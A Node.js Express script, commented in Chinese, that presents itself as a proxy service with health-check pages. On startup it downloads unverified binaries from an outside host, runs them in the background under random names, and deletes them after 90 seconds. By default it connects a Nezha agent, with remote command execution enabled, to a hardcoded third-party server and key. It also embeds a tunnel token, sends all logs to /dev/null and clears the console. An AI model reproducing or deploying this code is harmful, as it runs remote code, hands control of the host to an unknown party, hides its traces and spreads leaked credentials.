const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');

// ============ 环境变量配置 ============
const config = {
  UPLOAD_URL: process.env.UPLOAD_URL || '',
  PROJECT_URL: process.env.PROJECT_URL || '',
  AUTO_ACCESS: process.env.AUTO_ACCESS === 'true',
  FILE_PATH: process.env.FILE_PATH || './tmp',
  SUB_PATH: process.env.SUB_PATH || 'sb',
  PORT: process.env.SERVER_PORT || process.env.PORT || 3000,
  UUID: process.env.UUID || 'e51f0e70-3394-4873-978b-a9647fb352e4',
  NEZHA_SERVER: process.env.NEZHA_SERVER || 'mbb.svip888.us.kg:53100',
  NEZHA_PORT: process.env.NEZHA_PORT || '',
  NEZHA_KEY: process.env.NEZHA_KEY || 'VnrTnhgoack6PhnRH6lyshe4OVkHmPyM',
  ARGO_DOMAIN: process.env.ARGO_DOMAIN || 'apply.lnb.gv.uy',
  ARGO_AUTH: process.env.ARGO_AUTH || 'eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiOWJjYTllYzItZjE5Yi00YjhkLTk4YzMtYzgwMGQzMjk3MjhhIiwicyI6Ik5EQmhaV1ZrWkdNdE5qQXdOeTAwT0RGbUxXSTVNak10TmpZMllXUTNaVFJoT1RSbSJ9',
  ARGO_PORT: process.env.ARGO_PORT || 8001,
  CFIP: process.env.CFIP || 'cdns.doon.eu.org',
  CFPORT: process.env.CFPORT || 443,
  NAME: process.env.NAME || '',
};

// ============ 应用状态管理 ============
let isReady = false;
let serverStatus = {
  initialized: false,
  startTime: new Date().toISOString(),
  services: {
    nezha: false,
    xray: false,
    cloudflare: false
  }
};

// ============ 工具函数 ============

// 记录器
const logger = {
  info: (msg) => console.log(`[INFO] ${new Date().toISOString()} - ${msg}`),
  error: (msg) => console.error(`[ERROR] ${new Date().toISOString()} - ${msg}`),
  warn: (msg) => console.warn(`[WARN] ${new Date().toISOString()} - ${msg}`),
};

// 创建运行文件夹
function ensureDirectoryExists() {
  if (!fs.existsSync(config.FILE_PATH)) {
    fs.mkdirSync(config.FILE_PATH, { recursive: true });
    logger.info(`Directory ${config.FILE_PATH} created`);
  }
}

// 生成随机字符
function generateRandomName(length = 6) {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

// 获取系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  return ['arm', 'arm64', 'aarch64'].includes(arch) ? 'arm' : 'amd';
}

// ============ 初始化路径 ============
ensureDirectoryExists();

const randomNames = {
  npm: generateRandomName(),
  web: generateRandomName(),
  bot: generateRandomName(),
  php: generateRandomName(),
};

const paths = {
  npm: path.join(config.FILE_PATH, randomNames.npm),
  php: path.join(config.FILE_PATH, randomNames.php),
  web: path.join(config.FILE_PATH, randomNames.web),
  bot: path.join(config.FILE_PATH, randomNames.bot),
  sub: path.join(config.FILE_PATH, 'sub.txt'),
  list: path.join(config.FILE_PATH, 'list.txt'),
  bootLog: path.join(config.FILE_PATH, 'boot.log'),
  config: path.join(config.FILE_PATH, 'config.json'),
  tunnel: {
    json: path.join(config.FILE_PATH, 'tunnel.json'),
    yml: path.join(config.FILE_PATH, 'tunnel.yml'),
    yaml: path.join(config.FILE_PATH, 'config.yaml'),
  }
};

// ============ 健康检查和状态路由（优先定义） ============

// 健康检查端点 - 用于平台健康检测
app.get("/health", (req, res) => {
  res.status(200).json({
    status: "ok",
    timestamp: new Date().toISOString()
  });
});

// 备用健康检查端点
app.get("/healthz", (req, res) => {
  res.status(200).send("OK");
});

// 主路由 - 立即响应
app.get("/", (req, res) => {
  const uptime = Math.floor((Date.now() - new Date(serverStatus.startTime).getTime()) / 1000);
  const html = `
<!DOCTYPE html>
<html>
<head>
  <title>Proxy Service</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 800px;
      margin: 50px auto;
      padding: 20px;
      background: #f5f5f5;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    h1 { color: #333; margin-top: 0; }
    .status {
      display: inline-block;
      padding: 5px 15px;
      border-radius: 20px;
      font-weight: bold;
      margin: 10px 0;
    }
    .status.ready { background: #4CAF50; color: white; }
    .status.init { background: #FF9800; color: white; }
    .info { margin: 20px 0; line-height: 1.8; }
    .info strong { color: #555; }
    .endpoint {
      background: #f9f9f9;
      padding: 15px;
      border-left: 4px solid #2196F3;
      margin: 10px 0;
      font-family: monospace;
    }
    code {
      background: #e8e8e8;
      padding: 2px 6px;
      border-radius: 3px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🚀 Proxy Service</h1>
    <div class="status ${isReady ? 'ready' : 'init'}">
      ${isReady ? '✅ Running' : '⏳ Initializing'}
    </div>
    
    <div class="info">
      <p><strong>Uptime:</strong> ${uptime} seconds</p>
      <p><strong>Status:</strong> ${isReady ? 'All services initialized' : 'Initializing services in background'}</p>
      <p><strong>Services:</strong></p>
      <ul>
        <li>Nezha Monitor: ${serverStatus.services.nezha ? '✅' : '⏳'}</li>
        <li>Xray Proxy: ${serverStatus.services.xray ? '✅' : '⏳'}</li>
        <li>Cloudflare Tunnel: ${serverStatus.services.cloudflare ? '✅' : '⏳'}</li>
      </ul>
    </div>

    <h3>📡 Available Endpoints</h3>
    <div class="endpoint">
      <code>GET /health</code> - Health check (JSON)
    </div>
    <div class="endpoint">
      <code>GET /healthz</code> - Health check (Plain text)
    </div>
    <div class="endpoint">
      <code>GET /status</code> - Detailed status (JSON)
    </div>
    <div class="endpoint">
      <code>GET /${config.SUB_PATH}</code> - Subscription URL
    </div>

    <p style="margin-top: 30px; color: #888; font-size: 14px;">
      ${isReady ? 'Service is fully operational! 🎉' : 'Please wait while services are being initialized...'}
    </p>
  </div>
  
  ${!isReady ? `
  <script>
    // 自动刷新直到服务就绪
    setTimeout(() => location.reload(), 3000);
  </script>
  ` : ''}
</body>
</html>
  `;
  res.status(200).send(html);
});

// 状态查询端点
app.get("/status", (req, res) => {
  res.status(200).json({
    ready: isReady,
    ...serverStatus
  });
});

// ============ 节点管理 ============

// 删除历史节点
async function deleteHistoricalNodes() {
  try {
    if (!config.UPLOAD_URL || !fs.existsSync(paths.sub)) return;

    const fileContent = fs.readFileSync(paths.sub, 'utf-8');
    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => 
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
    );

    if (nodes.length === 0) return;

    await axios.post(`${config.UPLOAD_URL}/api/delete-nodes`, 
      { nodes },
      { headers: { 'Content-Type': 'application/json' }, timeout: 5000 }
    ).catch(() => null);
  } catch (err) {
    logger.warn(`Failed to delete historical nodes: ${err.message}`);
  }
}

// 清理旧文件
function cleanupOldFiles() {
  try {
    const files = fs.readdirSync(config.FILE_PATH);
    files.forEach(file => {
      const filePath = path.join(config.FILE_PATH, file);
      try {
        const stat = fs.statSync(filePath);
        if (stat.isFile() && ![paths.sub, paths.list].includes(filePath)) {
          fs.unlinkSync(filePath);
        }
      } catch (err) {
        // 忽略单个文件删除错误
      }
    });
    logger.info('Old files cleaned up');
  } catch (err) {
    logger.warn(`Cleanup failed: ${err.message}`);
  }
}

// ============ 配置生成 ============

// 生成 xray 配置文件
async function generateXrayConfig() {
  const config_content = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { 
        port: config.ARGO_PORT, 
        protocol: 'vless', 
        settings: { 
          clients: [{ id: config.UUID, flow: 'xtls-rprx-vision' }], 
          decryption: 'none', 
          fallbacks: [
            { dest: 3001 }, 
            { path: "/vless-argo", dest: 3002 }, 
            { path: "/vmess-argo", dest: 3003 }, 
            { path: "/trojan-argo", dest: 3004 }
          ] 
        }, 
        streamSettings: { network: 'tcp' } 
      },
      { 
        port: 3001, 
        listen: "127.0.0.1", 
        protocol: "vless", 
        settings: { clients: [{ id: config.UUID }], decryption: "none" }, 
        streamSettings: { network: "tcp", security: "none" } 
      },
      { 
        port: 3002, 
        listen: "127.0.0.1", 
        protocol: "vless", 
        settings: { clients: [{ id: config.UUID, level: 0 }], decryption: "none" }, 
        streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, 
        sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } 
      },
      { 
        port: 3003, 
        listen: "127.0.0.1", 
        protocol: "vmess", 
        settings: { clients: [{ id: config.UUID, alterId: 0 }] }, 
        streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, 
        sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } 
      },
      { 
        port: 3004, 
        listen: "127.0.0.1", 
        protocol: "trojan", 
        settings: { clients: [{ password: config.UUID }] }, 
        streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, 
        sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } 
      },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ 
      { protocol: "freedom", tag: "direct" }, 
      { protocol: "blackhole", tag: "block" } 
    ]
  };
  
  fs.writeFileSync(paths.config, JSON.stringify(config_content, null, 2));
  logger.info('Xray config generated');
}

// ============ 文件下载 ============

function downloadFile(fileName, fileUrl) {
  return new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(fileName);
    
    axios({
      method: 'get',
      url: fileUrl,
      responseType: 'stream',
      timeout: 30000,
    })
      .then(response => {
        response.data.pipe(writer);
        writer.on('finish', () => {
          writer.close();
          logger.info(`Downloaded ${path.basename(fileName)}`);
          resolve(fileName);
        });
        writer.on('error', err => {
          fs.unlink(fileName, () => {});
          reject(new Error(`Download failed: ${err.message}`));
        });
      })
      .catch(err => reject(new Error(`Download failed: ${err.message}`)));
  });
}

// 获取架构对应的下载链接
function getDownloadUrls(architecture) {
  const baseUrl = architecture === 'arm' 
    ? 'https://arm64.ssss.nyc.mn' 
    : 'https://amd64.ssss.nyc.mn';

  const urls = [
    { fileName: paths.web, fileUrl: `${baseUrl}/web` },
    { fileName: paths.bot, fileUrl: `${baseUrl}/bot` },
  ];

  if (config.NEZHA_SERVER && config.NEZHA_KEY) {
    if (config.NEZHA_PORT) {
      urls.unshift({ 
        fileName: paths.npm, 
        fileUrl: `${baseUrl}/agent` 
      });
    } else {
      urls.unshift({ 
        fileName: paths.php, 
        fileUrl: `${baseUrl}/v1` 
      });
    }
  }

  return urls;
}

// 下载所有文件
async function downloadAllFiles() {
  const architecture = getSystemArchitecture();
  logger.info(`System architecture: ${architecture}`);
  const urls = getDownloadUrls(architecture);
  logger.info(`Files to download: ${urls.length}`);

  if (urls.length === 0) {
    throw new Error('No files to download for current architecture');
  }

  try {
    for (const item of urls) {
      logger.info(`Downloading: ${path.basename(item.fileName)} from ${item.fileUrl}`);
    }
    await Promise.all(urls.map(item => downloadFile(item.fileName, item.fileUrl)));
    logger.info('All files downloaded successfully');
  } catch (err) {
    logger.error(`Download error: ${err.message}`);
    throw err;
  }
}

// 授权文件
async function authorizeFiles(filePaths) {
  const chmod = promisify(fs.chmod);
  const permissions = 0o775;

  for (const filePath of filePaths) {
    if (fs.existsSync(filePath)) {
      try {
        await chmod(filePath, permissions);
        logger.info(`Permission set for ${path.basename(filePath)}`);
      } catch (err) {
        logger.error(`Failed to set permission for ${filePath}: ${err.message}`);
      }
    }
  }
}

// ============ 进程管理 ============

// 生成 Nezha 配置
function generateNezhaConfig() {
  const port = config.NEZHA_SERVER.includes(':') 
    ? config.NEZHA_SERVER.split(':').pop() 
    : '';
  const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
  const tls = tlsPorts.has(port) ? 'true' : 'false';

  const configYaml = `client_secret: ${config.NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${config.NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${config.UUID}`;

  fs.writeFileSync(paths.tunnel.yaml, configYaml);
}

// 启动所有进程
async function startProcesses() {
  const filesToAuthorize = config.NEZHA_PORT 
    ? [paths.npm, paths.web, paths.bot] 
    : [paths.php, paths.web, paths.bot];

  await authorizeFiles(filesToAuthorize);

  // 启动 Nezha
  if (config.NEZHA_SERVER && config.NEZHA_KEY) {
    if (!config.NEZHA_PORT) {
      generateNezhaConfig();
      const cmd = `nohup ${paths.php} -c "${paths.tunnel.yaml}" >/dev/null 2>&1 &`;
      try {
        await exec(cmd);
        logger.info(`${randomNames.php} started`);
        serverStatus.services.nezha = true;
        await new Promise(resolve => setTimeout(resolve, 1000));
      } catch (err) {
        logger.error(`Failed to start ${randomNames.php}: ${err.message}`);
      }
    } else {
      const tlsFlag = ['443', '8443', '2096', '2087', '2083', '2053']
        .includes(config.NEZHA_PORT) ? '--tls' : '';
      const cmd = `nohup ${paths.npm} -s ${config.NEZHA_SERVER}:${config.NEZHA_PORT} -p ${config.NEZHA_KEY} ${tlsFlag} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
      try {
        await exec(cmd);
        logger.info(`${randomNames.npm} started`);
        serverStatus.services.nezha = true;
        await new Promise(resolve => setTimeout(resolve, 1000));
      } catch (err) {
        logger.error(`Failed to start ${randomNames.npm}: ${err.message}`);
      }
    }
  }

  // 启动 Xray
  const xrayCmd = `nohup ${paths.web} -c ${paths.config} >/dev/null 2>&1 &`;
  try {
    await exec(xrayCmd);
    logger.info(`${randomNames.web} started`);
    serverStatus.services.xray = true;
    await new Promise(resolve => setTimeout(resolve, 1000));
  } catch (err) {
    logger.error(`Failed to start xray: ${err.message}`);
  }

  // 启动 Cloudflare
  if (fs.existsSync(paths.bot)) {
    let args;

    if (config.ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${config.ARGO_AUTH}`;
    } else if (config.ARGO_AUTH.includes('TunnelSecret')) {
      args = `tunnel --edge-ip-version auto --config ${paths.tunnel.yml} run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${paths.bootLog} --loglevel info --url http://localhost:${config.ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${paths.bot} ${args} >/dev/null 2>&1 &`);
      logger.info(`${randomNames.bot} started`);
      serverStatus.services.cloudflare = true;
      await new Promise(resolve => setTimeout(resolve, 2000));
    } catch (err) {
      logger.error(`Failed to start cloudflare: ${err.message}`);
    }
  }
}

// ============ Argo 隧道管理 ============

function setupArgoTunnel() {
  if (!config.ARGO_AUTH || !config.ARGO_DOMAIN) {
    logger.info("Using quick tunnels (ARGO_DOMAIN or ARGO_AUTH not set)");
    return;
  }

  if (config.ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(paths.tunnel.json, config.ARGO_AUTH);
    const tunnelId = config.ARGO_AUTH.split('"')[11] || 'tunnel';
    const tunnelYaml = `tunnel: ${tunnelId}
credentials-file: ${paths.tunnel.json}
protocol: http2

ingress:
  - hostname: ${config.ARGO_DOMAIN}
    service: http://localhost:${config.ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
`;
    fs.writeFileSync(paths.tunnel.yml, tunnelYaml);
    logger.info('Argo tunnel configured with TunnelSecret');
  } else {
    logger.info('Using token-based Argo tunnel');
  }
}

// 提取域名
async function extractDomainFromBootLog(retries = 0, maxRetries = 3) {
  try {
    const fileContent = fs.readFileSync(paths.bootLog, 'utf-8');
    const domainMatch = fileContent.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
    
    if (domainMatch) {
      const domain = domainMatch[1];
      logger.info(`Domain extracted: ${domain}`);
      return domain;
    }

    if (retries < maxRetries) {
      logger.warn(`Domain not found, retrying (${retries + 1}/${maxRetries})...`);
      await new Promise(resolve => setTimeout(resolve, 2000));
      return extractDomainFromBootLog(retries + 1, maxRetries);
    }

    throw new Error('Domain extraction failed after max retries');
  } catch (err) {
    logger.error(`Failed to extract domain: ${err.message}`);
    throw err;
  }
}

// 获取 ISP 信息
async function getMetaInfo() {
  const apis = [
    'https://ipapi.co/json/',
    'http://ip-api.com/json/',
  ];

  for (const api of apis) {
    try {
      const response = await axios.get(api, { timeout: 5000 });
      if (api.includes('ipapi.co') && response.data.country_code && response.data.org) {
        return `${response.data.country_code}_${response.data.org}`;
      }
      if (api.includes('ip-api.com') && response.data.status === 'success' && response.data.countryCode && response.data.org) {
        return `${response.data.countryCode}_${response.data.org}`;
      }
    } catch (err) {
      // 继续尝试下一个 API
    }
  }

  return 'Unknown';
}

// ============ 订阅生成 ============

async function generateSubscription(argoDomain) {
  const isp = await getMetaInfo();
  const nodeName = config.NAME ? `${config.NAME}-${isp}` : isp;

  const vmess = {
    v: '2',
    ps: nodeName,
    add: config.CFIP,
    port: config.CFPORT,
    id: config.UUID,
    aid: '0',
    scy: 'none',
    net: 'ws',
    type: 'none',
    host: argoDomain,
    path: '/vmess-argo?ed=2560',
    tls: 'tls',
    sni: argoDomain,
    alpn: '',
    fp: 'firefox'
  };

  const subContent = `vless://${config.UUID}@${config.CFIP}:${config.CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}

vmess://${Buffer.from(JSON.stringify(vmess)).toString('base64')}

trojan://${config.UUID}@${config.CFIP}:${config.CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}
`;

  const encoded = Buffer.from(subContent).toString('base64');
  fs.writeFileSync(paths.sub, encoded);
  logger.info('Subscription generated and saved');

  // 设置订阅路由
  app.get(`/${config.SUB_PATH}`, (req, res) => {
    res.set('Content-Type', 'text/plain; charset=utf-8');
    res.send(encoded);
  });

  await uploadNodes();
  return subContent;
}

// 上传节点
async function uploadNodes() {
  if (config.UPLOAD_URL && config.PROJECT_URL) {
    const subscriptionUrl = `${config.PROJECT_URL}/${config.SUB_PATH}`;
    try {
      const response = await axios.post(
        `${config.UPLOAD_URL}/api/add-subscriptions`,
        { subscription: [subscriptionUrl] },
        { headers: { 'Content-Type': 'application/json' }, timeout: 5000 }
      );
      if (response.status === 200) {
        logger.info('Subscription uploaded successfully');
      }
    } catch (err) {
      if (err.response?.status === 400) {
        logger.warn('Subscription already exists');
      } else {
        logger.warn(`Upload failed: ${err.message}`);
      }
    }
  }
}

// ============ 自动保活 ============

async function addAutoAccessTask() {
  if (!config.AUTO_ACCESS || !config.PROJECT_URL) {
    logger.info('Auto-access disabled');
    return;
  }

  try {
    const response = await axios.post(
      'https://oooo.serv00.net/add-url',
      { url: config.PROJECT_URL },
      { headers: { 'Content-Type': 'application/json' }, timeout: 5000 }
    );
    logger.info('Auto-access task added successfully');
  } catch (err) {
    logger.error(`Failed to add auto-access task: ${err.message}`);
  }
}

// ============ 文件清理 ============

function scheduleFileCleanup() {
  setTimeout(() => {
    const filesToDelete = [paths.bootLog, paths.config, paths.web, paths.bot];

    if (config.NEZHA_PORT) {
      filesToDelete.push(paths.npm);
    } else if (config.NEZHA_SERVER && config.NEZHA_KEY) {
      filesToDelete.push(paths.php);
    }

    const deleteCmd = process.platform === 'win32'
      ? `del /f /q ${filesToDelete.join(' ')} > nul 2>&1`
      : `rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`;

    exec(deleteCmd, (error) => {
      console.clear();
      logger.info('Application running');
      logger.info('Thank you for using this script!');
    });
  }, 90000); // 90 seconds
}

// ============ 主启动函数 ============

async function startServer() {
  try {
    logger.info('Server initialization started');

    // 设置初始化超时保护（2分钟后强制标记为就绪）
    const initTimeout = setTimeout(() => {
      if (!isReady) {
        logger.warn('Initialization timeout - marking as ready anyway');
        isReady = true;
        serverStatus.initialized = true;
      }
    }, 120000); // 2 minutes

    logger.info('Step 1: Setting up Argo tunnel');
    setupArgoTunnel();

    logger.info('Step 2: Deleting historical nodes');
    await deleteHistoricalNodes();

    logger.info('Step 3: Cleaning up old files');
    cleanupOldFiles();

    logger.info('Step 4: Generating Xray config');
    await generateXrayConfig();

    logger.info('Step 5: Downloading files');
    try {
      await downloadAllFiles();
    } catch (err) {
      logger.warn('Download failed, but continuing: ' + err.message);
    }

    logger.info('Step 6: Starting processes');
    await startProcesses();

    logger.info('Step 7: Extracting domain');
    let domain = config.ARGO_DOMAIN;
    if (!config.ARGO_DOMAIN || !config.ARGO_AUTH) {
      logger.info('ARGO_DOMAIN not set, waiting for cloudflare tunnel...');
      await new Promise(resolve => setTimeout(resolve, 5000));
      try {
        domain = await extractDomainFromBootLog();
      } catch (err) {
        logger.warn('Could not extract domain: ' + err.message);
        domain = 'localhost';
      }
    }
    logger.info(`Using domain: ${domain}`);

    logger.info('Step 8: Generating subscription');
    try {
      await generateSubscription(domain);
    } catch (err) {
      logger.warn('Subscription generation failed: ' + err.message);
    }

    logger.info('Step 9: Adding auto-access task');
    await addAutoAccessTask();

    logger.info('Step 10: Scheduling file cleanup');
    scheduleFileCleanup();

    logger.info('Server initialization completed successfully');
    
    // 清除超时定时器
    clearTimeout(initTimeout);
    
    // 标记服务已就绪
    isReady = true;
    serverStatus.initialized = true;
    
  } catch (error) {
    logger.error(`Startup failed: ${error.message}`);
    logger.error(`Stack: ${error.stack}`);
    
    // 即使出错也标记为就绪，让服务继续运行
    isReady = true;
    serverStatus.initialized = true;
    
    // 不退出，继续运行服务器
    logger.info('Service will continue running despite initialization errors');
  }
}

// ============ 启动服务器 ============

// 先启动 HTTP 服务器，再执行初始化
app.listen(config.PORT, () => {
  logger.info(`HTTP server listening on port ${config.PORT}`);
  logger.info('Health check endpoints available at /health and /healthz');
  
  // 在后台执行初始化
  startServer().catch(error => {
    logger.error(`Unhandled startup error: ${error.message}`);
  });
});

// 优雅关闭
process.on('SIGINT', () => {
  logger.info('Server shutting down gracefully');
  process.exit(0);
});

process.on('SIGTERM', () => {
  logger.info('Server shutting down gracefully (SIGTERM)');
  process.exit(0);
});
